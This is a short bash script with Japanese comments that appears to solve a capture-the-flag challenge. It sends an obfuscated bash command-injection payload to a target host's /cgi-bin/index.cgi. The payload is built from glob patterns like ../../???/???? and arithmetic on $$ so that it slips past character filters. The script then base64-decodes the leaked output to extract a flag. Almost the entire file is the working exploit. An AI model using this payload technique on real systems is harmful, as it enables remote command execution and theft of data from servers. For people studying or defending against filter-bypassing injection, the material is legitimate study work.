#!/bin/bash

# ubuntuで動作確認しています

if [ "" = "$1" ]
then
  echo usage: $0 [target_hostname]
  exit 1
else
  TARGET_HOST="$1"
fi

#------#
# main #
#------#

# flag実行パラメタ
PARAM='X\[$(____=$(../../???/d?t?);______=echo;__=($($______$\{____:$(($$/$$+$$/$$+$$/$$)):$(($$/$$))\}../../???/????));___=($($______$\{____:$(($$/$$+$$/$$+$$/$$)):$(($$/$$))\}../../???/??????));$\{__\[$(($$/$$+$$/$$))$?\]\}|$\{___\[$$/$$\]\})\]'

# 本番は http を https に修正するかも?
curl -sS "http://$TARGET_HOST/cgi-bin/index.cgi?q="$PARAM \
  -H 'Connection: keep-alive' \
  -H 'Cache-Control: max-age=0' \
  -H 'DNT: 1' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
  -H 'Accept-Language: ja,en-US;q=0.9,en;q=0.8' \
  --compressed \
  --insecure \
  | grep "line 5"|awk -F":" '{print $3}'|tr -d ' '|base64 -d
